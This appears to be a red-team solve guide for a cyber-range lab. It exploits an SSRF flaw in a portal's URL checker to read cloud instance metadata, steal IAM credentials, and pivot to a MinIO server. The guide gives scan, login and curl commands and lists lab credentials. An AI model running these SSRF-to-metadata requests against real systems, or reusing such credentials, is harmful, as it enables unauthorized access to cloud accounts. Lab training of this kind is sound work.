# Solve Guide — Red Team
## RNG-CLD-01 | M1 — cld-webapp | SSRF → Cloud Metadata Credential Theft
**Technique:** T1552.005 — Cloud Instance Metadata API  
**Difficulty:** ★★☆☆☆ | **Pivot In:** `cloud_api_key: pul-cloud-dev-aK8x2mP9!2024` (from Dev Zone M5 AWX output)

---

## Objective
Steal the cloud IAM role credentials from the Cloud Metadata Service (IMDS) at `169.254.169.254` by exploiting a Server-Side Request Forgery (SSRF) vulnerability in the URL Health Checker tool of the PUL Cloud Developer Portal.

---

## Step 1 — Discover the Portal

```bash
# Nmap service scan on M1
nmap -sV -sC -p- 193.0.3.155 -oN m1_scan.txt

# Key findings:
# 8080/tcp  open  http  PUL Cloud Developer Portal
```

Navigate to `http://193.0.3.155:8080` — you see a cloud portal login page.

<img width="1245" height="949" alt="image" src="https://github.com/user-attachments/assets/19944f5a-98ef-467d-9e87-ace426bcf1b3" />


---

## Step 2 — Authenticate to the Portal

You have the API key from Dev Zone M5 AWX job output: `pul-cloud-dev-aK8x2mP9!2024`

**Option A: Web login**
```
Username: cloud-dev
Password: CloudDev@PUL2024!
```

<img width="2042" height="1129" alt="image" src="https://github.com/user-attachments/assets/a0f7bf58-c437-41d1-a8ea-9793ef75e335" />



**Option B: API key authentication** (useful for scripting)
```bash
# The portal accepts X-Cloud-API-Key header on all authenticated routes
curl -s -H "X-Cloud-API-Key: pul-cloud-dev-aK8x2mP9!2024" \
    http://193.0.3.155:8080/dashboard
```
<img width="1883" height="1041" alt="image" src="https://github.com/user-attachments/assets/43a0c77d-91a4-4ba9-8e6c-c9d52b3dce53" />

---

## Step 3 — Identify the SSRF Vulnerability

Navigate to **Tools → URL Health Checker**. The page description states:
> *"The URL Health Checker fetches a URL from this server and returns the raw response. Useful for testing webhooks and internal service connectivity."*

This fetches URLs **from the server** — the web application makes the outbound request, not your browser. This is the SSRF sink.

There is no server-side validation or allowlist on the URL input.

---

## Step 4 — Enumerate the IMDS

The Cloud Developer Portal runs on a cloud instance with an attached IAM role. The Instance Metadata Service (IMDS) is accessible at `169.254.169.254` — a link-local address only reachable from the instance itself, but reachable through SSRF.

**Step 4.1 — Verify IMDS is reachable:**
```
# In URL Health Checker, submit:
http://169.254.169.254/latest/meta-data/
```

Expected output:
```
ami-id
ami-launch-index
ami-manifest-path
hostname
iam/
instance-id
instance-type
local-ipv4
placement/
```

<img width="2280" height="1176" alt="image" src="https://github.com/user-attachments/assets/96583ff9-12af-4d39-bac2-4124f6e5dec8" />


**Step 4.2 — Enumerate the IAM path:**
```
# Submit URL:
http://169.254.169.254/latest/meta-data/iam/
```
Output: `info` and `security-credentials/`

<img width="1713" height="836" alt="image" src="https://github.com/user-attachments/assets/7d089730-3990-4b95-bc43-8da453794b2b" />


**Step 4.3 — List the IAM role name:**
```
# Submit URL:
http://169.254.169.254/latest/meta-data/iam/security-credentials/
```
Output: `pul-cloud-role`

---

<img width="1969" height="639" alt="image" src="https://github.com/user-attachments/assets/7dad4515-5b45-4f08-b3d8-7beb708bc9b6" />


## Step 5 — Steal the IAM Credentials (THE GOAL)

```
# Submit URL:
http://169.254.169.254/latest/meta-data/iam/security-credentials/pul-cloud-role
```

Response:
```json
{
  "Code": "Success",
  "Type": "AWS-HMAC",
  "AccessKeyId": "AKIAPUL2024CLDSVC01",
  "SecretAccessKey": "pULcLd/S3cr3t2024/K3y!",
  "Token": "AQoDYXdzEJr//////////wEaoAK0M2FakeSessionToken4GridfallOp==",
  "Expiration": "2025-12-31T23:59:59Z",
  "LastUpdated": "2024-11-15T06:00:00Z"
}
```
<img width="1828" height="624" alt="image" src="https://github.com/user-attachments/assets/5082f168-3815-4a2c-b0b8-551f1a3f99bb" />


**Or via API + curl (no browser needed):**
```bash
# Step 1: Login and capture cookie
curl -sc /tmp/cld-cookie.txt -X POST http://11.0.2.10:8080/login \
    -d "username=cloud-dev&password=CloudDev%40PUL2024%21" \
    -L -o /dev/null

# Step 2: SSRF via API
curl -sb /tmp/cld-cookie.txt -X POST http://11.0.2.10:8080/tools/url-check \
    -d "url=http%3A%2F%2F169.254.169.254%2Flatest%2Fmeta-data%2Fiam%2Fsecurity-credentials%2Fpul-cloud-role"
```

---

## Step 6 — Record Credentials and Pivot

```
AccessKeyId    : AKIAPUL2024CLDSVC01
SecretAccessKey: pULcLd/S3cr3t2024/K3y!
```

These credentials match the MinIO root credentials on **M2 (11.0.2.20:9000)**.

**Verify against M2:**
```bash
export AWS_ACCESS_KEY_ID=AKIAPUL2024CLDSVC01
export AWS_SECRET_ACCESS_KEY='pULcLd/S3cr3t2024/K3y!'

aws s3 ls --endpoint-url http://11.0.2.20:9000
# Expected: pul-cloud-backups    pul-cloud-internal
```

---

## Summary

| Item | Value |
|---|---|
| Vulnerability | SSRF — unrestricted URL fetch from server |
| Target Service | Cloud Instance Metadata Service (IMDS) at 169.254.169.254 |
| Stolen Credential | AccessKeyId: AKIAPUL2024CLDSVC01 |
| Next Target | M2 MinIO (11.0.2.20:9000) |
| MITRE | T1552.005, T1190 |
